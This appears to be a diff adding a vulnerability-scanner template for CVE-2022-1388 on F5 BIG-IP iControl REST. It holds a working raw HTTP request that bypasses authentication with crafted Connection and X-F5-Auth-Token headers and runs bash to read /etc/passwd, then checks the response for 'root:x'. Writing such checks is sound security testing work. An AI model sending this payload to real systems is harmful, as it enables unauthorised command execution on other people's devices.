@@ -1,0 +1,30 @@
+id: CVE-2022-1388
+
+info:
+  name: F5 Big-IP iControl REST RCE
+  author: dk4trin
+  severity: critical
+  tags: cve,cve2022,bigip,rce
+
+requests:
+  - raw:
+      - |
+        POST /mgmt/tm/util/bash HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46
+        Connection: keep-alive, X-F5-Auth-Token
+        X-F5-Auth-Token: 0
+
+        {"command": "run" , "utilCmdArgs": " -c ' cat /etc/passwd' " }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'root:x'
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
